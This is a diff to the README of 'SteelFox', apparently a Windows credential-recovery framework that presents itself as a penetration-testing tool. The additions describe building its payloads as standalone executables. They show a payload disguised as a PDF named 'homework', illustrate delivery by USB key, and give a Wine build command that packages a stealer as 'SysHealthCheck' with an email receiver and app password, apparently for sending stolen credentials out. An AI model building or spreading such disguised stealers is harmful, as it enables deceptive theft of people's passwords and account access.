@@ -3,7 +3,10 @@
 </p>
 
 <h1 align="center">SteelFox</h1>
-<p align="center"><strong>Advanced Windows Credential & Reconnaissance Framework</strong></p>
+<p align="center">
+  <img src="steelfox/assets/transparent-windows-logo.png" alt="Windows Logo" width="24" style="vertical-align: middle; margin-right: 8px;" />
+  <strong>Advanced Windows Credential & Reconnaissance Framework</strong>
+</p>
 
 <p align="center">
   <img alt="Version" src="https://img.shields.io/badge/version-1.3.1-orange?style=for-the-badge" />
@@ -35,12 +38,16 @@
 
 ### Use Cases
 
-| Context                    | Description                                       |
-| -------------------------- | ------------------------------------------------- |
-| 🔐 **Penetration Testing** | Credential recovery during authorized engagements |
-| 🎓 **Academic Research**   | Cybersecurity lab work and academic study         |
-| 🏢 **Internal Audits**     | Assess credential hygiene in your organization    |
-| 🧪 **Security Labs**       | Controlled testing environments                   |
+<p align="center">
+  <img src="steelfox/assets/usb-acces-image-of-usb-key-on-computer.png" alt="Physical Payload Delivery" width="80%" style="border-radius: 8px;" />
+</p>
+
+| Context                 | Description                                       |
+| ----------------------- | ------------------------------------------------- |
+| **Penetration Testing** | Credential recovery during authorized engagements |
+| **Research**            | Cybersecurity lab work and academic study         |
+| **Internal Audits**     | Assess credential hygiene in your organization    |
+| **Security Labs**       | Controlled testing environments                   |
 
 ---
 
@@ -189,7 +196,7 @@ steelfox all --password "MyMasterPw"
 
 SteelFox credential recovery is **Windows-only** at this time. However, Linux users can:
 
-1. **Build Windows payloads** using the CLI builder + GitHub Actions CI (no Windows required)
+1. **Build Windows payloads** using the CLI builder via **Wine** or GitHub Actions CI.
 2. **Install the package** in preparation for future Linux module support
 
 ```bash
@@ -208,6 +215,10 @@ python builder_cli.py \
 > ⚠️ **Important:** PyInstaller does **not** support cross-compilation. The `.exe` can only be produced on a Windows machine (or a Windows CI runner). See [Building on Linux](#building-on-linux) for the GitHub Actions workflow.
 
 ### CLI Reference
+
+<p align="center">
+  <img src="steelfox/assets/screen-shoot-command-line-interface.png" alt="SteelFox Command Line Interface" width="90%" />
+</p>
 
 | Flag                                 | Description                                          |
 | ------------------------------------ | ---------------------------------------------------- |
@@ -263,6 +274,11 @@ The **SteelFox Builder** packages the entire framework into a self-contained `.e
 
 <p align="center">
   <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
+</p>
+<br/>
+<p align="center">
+  <img src="steelfox/assets/example-of-executable-file-named-homework-and-hav-pdf-icon.png" alt="Spoofed Executable Example" width="60%" />
+  <br/><br/><em>Example of a generated payload mimicking a PDF document.</em>
 </p>
 
 ### How the Builder Works
@@ -326,7 +342,29 @@ Environment variables are also supported:
 
 ### Building on Linux
 
-PyInstaller does **not** support cross-compilation. To produce Windows `.exe` files from Linux, use the **GitHub Actions CI/CD pipeline**:
+PyInstaller does **not** support cross-compilation natively. To produce Windows `.exe` files from Linux, you have two primary options:
+
+**Option 1: Using Wine (Local)**
+The most reliable local method is to use [Wine](https://www.winehq.org/) to run the Windows version of Python and PyInstaller directly on your Linux machine:
+
+```bash
+# 1. Install Wine on your Linux system
+sudo apt update && sudo apt install wine
+
+# 2. Download and install Python for Windows (via Wine)
+# (Make sure to download the Windows installer e.g., python-3.11.x-amd64.exe)
+wine python-3.11.x-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
+
+# 3. Install dependencies in the Wine Python environment
+wine python -m pip install -r requirements.txt
+wine python -m pip install pyinstaller
+
+# 4. Run the builder through Wine
+wine python builder_cli.py --receiver you@gmail.com --password "APP_PASS" --name SysHealthCheck --output ./dist
+```
+
+**Option 2: Using GitHub Actions (Remote)**
+Alternatively, use the **GitHub Actions CI/CD pipeline** which provisions a Windows runner:
 
 ```bash
 # Tag and push to trigger a release build on a Windows runner
